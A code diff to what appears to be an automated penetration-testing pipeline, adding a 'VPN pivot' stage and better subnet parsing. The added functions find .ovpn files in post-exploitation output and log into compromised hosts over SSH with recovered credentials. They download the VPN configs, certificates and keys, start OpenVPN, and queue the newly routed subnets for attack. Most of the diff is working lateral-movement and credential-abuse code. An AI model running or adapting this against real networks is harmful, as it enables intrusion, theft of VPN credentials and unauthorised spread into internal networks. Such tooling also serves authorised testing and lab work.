@@ -504,37 +504,300 @@ def parse_args() -> argparse.Namespace:
 
 def _extract_pivot_subnets(postex_data: dict, known_cidrs: set[str]) -> set[str]:
     """
-    Parse post-exploitation command outputs for IP addresses that belong to
-    subnets we have not yet scanned.  Derives a /24 for each new IP found
-    in arp, ip route, ip addr, and ipconfig output.
+    Parse post-exploitation command outputs for new subnets.
 
-    Returns a set of CIDR strings (e.g. {"10.10.20.0/24"}).
+    Strategy (in priority order):
+      1. Parse 'ip route' output for explicit CIDR routes (e.g. "172.16.12.0/27 via ...")
+      2. Parse 'ip addr' output for interface CIDRs (e.g. "inet 172.16.12.1/27")
+      3. Parse 'ipconfig' output for Windows subnet masks
+      4. Fallback: derive /24 for any IP found in arp/route output
+
+    Returns a set of CIDR strings.
     """
     new_cidrs: set[str] = set()
+    # Regex for explicit CIDR notation in route/addr output
+    cidr_pattern = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})\b")
     ip_pattern = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")
 
-    # Collect every string from every command output
-    raw_text = ""
+    # Collect text from route/addr commands specifically, and all text for fallback
+    route_text = ""
+    all_text = ""
     for host_entry in postex_data.get("hosts", []):
         for cmd in host_entry.get("commands_run", []):
-            raw_text += cmd.get("output", "") + "\n"
+            output = cmd.get("output", "")
+            all_text += output + "\n"
+            command = cmd.get("command", "")
+            if any(k in command for k in ("ip addr", "ip route", "ipconfig")):
+                route_text += output + "\n"
 
-    for match in ip_pattern.finditer(raw_text):
+    # Strategy 1+2: extract explicit CIDRs from route/addr output
+    for match in cidr_pattern.finditer(route_text):
+        cidr_str = match.group(1)
+        try:
+            net = ipaddress.IPv4Network(cidr_str, strict=False)
+        except ValueError:
+            continue
+        if net.is_loopback or net.is_link_local or net.is_multicast:
+            continue
+        if net.prefixlen >= 32 or net.prefixlen < 8:
+            continue
+        normalized = str(net)
+        if normalized not in known_cidrs:
+            new_cidrs.add(normalized)
+
+    # If we found explicit CIDRs, prefer those over the /24 fallback
+    if new_cidrs:
+        return new_cidrs
+
+    # Strategy 4: fallback — derive /24 for bare IPs (no CIDR in output)
+    for match in ip_pattern.finditer(all_text):
         ip_str = match.group(1)
         try:
             ip = ipaddress.IPv4Address(ip_str)
         except ValueError:
             continue
-        # Skip loopback, link-local, multicast, and broadcast
         if ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.packed[-1] == 255:
             continue
-        # Derive the /24 containing this IP
         net = ipaddress.IPv4Network(f"{ip_str}/24", strict=False)
         cidr_str = str(net)
         if cidr_str not in known_cidrs:
             new_cidrs.add(cidr_str)
 
     return new_cidrs
+
+
+# ---------------------------------------------------------------------------
+# VPN pivot — discover, download, and connect OpenVPN configs
+# ---------------------------------------------------------------------------
+
+_VPN_PROCESS: subprocess.Popen | None = None  # track the openvpn child process
+
+
+def _find_ovpn_paths(postex_data: dict) -> list[tuple[str, str, str, str]]:
+    """
+    Scan post-ex output for .ovpn file paths on compromised hosts.
+    Returns list of (host_ip, ovpn_remote_path, username, password).
+    """
+    results = []
+    ovpn_re = re.compile(r"(/\S+\.ovpn)")
+
+    # Build a map of host_ip -> (username, password) from exploitation state
+    exploit_data = _load_json(STATE_FILES["exploitation"]) or {}
+    host_creds: dict[str, tuple[str, str]] = {}
+    for r in exploit_data.get("results", []):
+        if r.get("success") and r.get("credentials_recovered"):
+            cred = r["credentials_recovered"][0]
+            host_creds[r["host"]] = (cred.get("username", ""), cred.get("password", ""))
+
+    for host_entry in postex_data.get("hosts", []):
+        ip = host_entry.get("ip", "")
+        for cmd in host_entry.get("commands_run", []):
+            output = cmd.get("output", "")
+            for match in ovpn_re.finditer(output):
+                ovpn_path = match.group(1)
+                username, password = host_creds.get(ip, ("", ""))
+                if username and password:
+                    results.append((ip, ovpn_path, username, password))
+                    info(f"Found .ovpn config on {ip}: {ovpn_path}")
+
+    return results
+
+
+def _download_ovpn_files(
+    host: str, ovpn_path: str, username: str, password: str
+) -> Path | None:
+    """
+    Download the .ovpn file and any referenced cert/key files from a
+    compromised host via paramiko SFTP.  Returns the local .ovpn path
+    or None on failure.
+    """
+    try:
+        import paramiko
+    except ImportError:
+        err("paramiko not installed — cannot download VPN config")
+        return None
+
+    local_dir = STATE_DIR / "vpn_pivot"
+    local_dir.mkdir(parents=True, exist_ok=True)
+
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(
+            host, port=22, username=username, password=password,
+            timeout=10, look_for_keys=False, allow_agent=False,
+        )
+        sftp = client.open_sftp()
+
+        # Download the .ovpn file
+        local_ovpn = local_dir / Path(ovpn_path).name
+        info(f"Downloading {ovpn_path} from {host}...")
+        sftp.get(ovpn_path, str(local_ovpn))
+
+        # Parse the .ovpn for referenced cert/key/ca files and download them too
+        ovpn_content = local_ovpn.read_text(errors="replace")
+        remote_dir = str(Path(ovpn_path).parent)
+
+        for directive in ("ca", "cert", "key", "tls-auth", "tls-crypt"):
+            pattern = re.compile(rf"^\s*{directive}\s+(\S+)", re.MULTILINE)
+            m = pattern.search(ovpn_content)
+            if m:
+                ref_file = m.group(1)
+                # If relative path, resolve against the .ovpn's directory
+                if not ref_file.startswith("/"):
+                    ref_file = f"{remote_dir}/{ref_file}"
+                local_ref = local_dir / Path(ref_file).name
+                try:
+                    info(f"Downloading referenced file: {ref_file}")
+                    sftp.get(ref_file, str(local_ref))
+                    # Rewrite the .ovpn to point at the local copy
+                    ovpn_content = ovpn_content.replace(
+                        m.group(0).strip(),
+                        f"{directive} {local_ref}",
+                    )
+                except Exception as exc:
+                    warn(f"Could not download {ref_file}: {exc}")
+
+        # Write updated .ovpn with local paths
+        local_ovpn.write_text(ovpn_content)
+
+        sftp.close()
+        client.close()
+        ok(f"VPN config downloaded to {local_ovpn}")
+        return local_ovpn
+
+    except Exception as exc:
+        err(f"Failed to download VPN config from {host}: {exc}")
+        return None
+
+
+def _connect_vpn(ovpn_path: Path, timeout: int = 30) -> bool:
+    """
+    Start OpenVPN with the downloaded config.  Waits for a tun interface
+    to appear (indicating the tunnel is up).  Returns True on success.
+    """
+    global _VPN_PROCESS
+
+    if _VPN_PROCESS is not None and _VPN_PROCESS.poll() is None:
+        warn("OpenVPN process already running — skipping reconnect")
+        return True
+
+    info(f"Starting OpenVPN with {ovpn_path}...")
+    tlog("pivot", f"Connecting OpenVPN: {ovpn_path}", "attempt")
+
+    log_path = STATE_DIR / "vpn_pivot" / "openvpn.log"
+    try:
+        _VPN_PROCESS = subprocess.Popen(
+            ["openvpn", "--config", str(ovpn_path), "--daemon",
+             "--log", str(log_path), "--writepid", str(STATE_DIR / "vpn_pivot" / "openvpn.pid")],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except FileNotFoundError:
+        err("openvpn binary not found in PATH")
+        return False
+    except Exception as exc:
+        err(f"Failed to start OpenVPN: {exc}")
+        return False
+
+    # Wait for a tun/tap interface to appear
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        time.sleep(2)
+        try:
+            out = subprocess.check_output(["ip", "link", "show"], text=True, timeout=5)
+            if "tun" in out or "tap" in out:
+                ok("VPN tunnel established (tun interface detected)")
+                tlog("pivot", "OpenVPN tunnel up", "success")
+                # Give routes a moment to propagate
+                time.sleep(2)
+                return True
+        except Exception:
+            pass
+
+    err(f"OpenVPN did not establish tunnel within {timeout}s")
+    # Dump the last few lines of the log for debugging
+    if log_path.exists():
+        tail = log_path.read_text(errors="replace").splitlines()[-10:]
+        for line in tail:
+            info(f"  openvpn: {line}")
+    tlog("pivot", "OpenVPN tunnel failed", "error")
+    return False
+
+
+def _get_new_routes_after_vpn(known_cidrs: set[str]) -> set[str]:
+    """
+    After VPN connects, read `ip route` on Kali to find newly pushed routes
+    that we haven't scanned yet.  Returns set of CIDR strings.
+    """
+    new_cidrs: set[str] = set()
+    try:
+        out = subprocess.check_output(["ip", "route", "show"], text=True, timeout=5)
+    except Exception:
+        return new_cidrs
+
+    cidr_re = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})\b")
+    for line in out.splitlines():
+        m = cidr_re.match(line.strip())
+        if not m:
+            continue
+        cidr_str = m.group(1)
+        try:
+            net = ipaddress.IPv4Network(cidr_str, strict=False)
+        except ValueError:
+            continue
+        if net.is_loopback or net.is_link_local or net.is_multicast:
+            continue
+        if net.prefixlen >= 32 or net.prefixlen < 8:
+            continue
+        normalized = str(net)
+        if normalized not in known_cidrs:
+            new_cidrs.add(normalized)
+            info(f"New route from VPN: {normalized}")
+
+    return new_cidrs
+
+
+def _attempt_vpn_pivot(
+    postex_data: dict, known_cidrs: set[str], dry_run: bool
+) -> set[str]:
+    """
+    End-to-end VPN pivot:
+      1. Scan post-ex output for .ovpn paths
+      2. Download the config + certs via SFTP
+      3. Connect OpenVPN
+      4. Read new routes from Kali's routing table
+    Returns set of new CIDR strings to scan.
+    """
+    ovpn_entries = _find_ovpn_paths(postex_data)
+    if not ovpn_entries:
+        return set()
+
+    if dry_run:
+        new_cidrs: set[str] = set()
+        for host_ip, ovpn_path, _, _ in ovpn_entries:
+            warn(f"[DRY-RUN] Would download {ovpn_path} from {host_ip} and connect VPN")
+            tlog("pivot", f"DRY-RUN: VPN pivot via {host_ip}:{ovpn_path}", "dry_run")
+        return new_cidrs
+
+    # Try each discovered .ovpn until one connects
+    for host_ip, ovpn_remote, username, password in ovpn_entries:
+        tlog("pivot", f"Attempting VPN pivot via {host_ip}: {ovpn_remote}", "attempt")
+
+        local_ovpn = _download_ovpn_files(host_ip, ovpn_remote, username, password)
+        if not local_ovpn:
+            continue
+
+        if _connect_vpn(local_ovpn):
+            new_routes = _get_new_routes_after_vpn(known_cidrs)
+            if new_routes:
+                return new_routes
+            else:
+                warn("VPN connected but no new routes found — check server push config")
+                return set()
+
+    warn("All VPN pivot attempts failed")
+    return set()
 
 
 def _snapshot_credentials() -> frozenset[tuple[str, str]]:
@@ -745,8 +1008,17 @@ def main() -> None:
         host_snapshot = new_host_snapshot
         cred_snapshot = new_cred_snapshot
 
-        # ── Extract pivot subnets from post-ex output ──────────────────────
+        # ── VPN pivot: download .ovpn from compromised hosts, connect ─────
         postex_data = _load_json(STATE_FILES["postex"]) or {}
+        vpn_subnets = _attempt_vpn_pivot(postex_data, known_cidrs, DRY_RUN)
+
+        for subnet in sorted(vpn_subnets):
+            warn(f"VPN pivot opened new subnet: {subnet}")
+            tlog("orchestrator", f"VPN pivot subnet: {subnet}", "pivot")
+            known_cidrs.add(subnet)
+            pending_cidrs.append(subnet)
+
+        # ── Extract pivot subnets from post-ex output (route/addr parsing) ──
         pivot_subnets = _extract_pivot_subnets(postex_data, known_cidrs)
 
         for subnet in sorted(pivot_subnets):
@@ -756,7 +1028,7 @@ def main() -> None:
             pending_cidrs.append(subnet)
 
         # ── Convergence check ──────────────────────────────────────────────
-        if not pivot_subnets and not new_hosts and not new_creds:
+        if not vpn_subnets and not pivot_subnets and not new_hosts and not new_creds:
             ok(f"No new attack surface found after iteration {iteration} — converged.")
             tlog("orchestrator", "Pipeline converged — no new surface", "converged")
             break
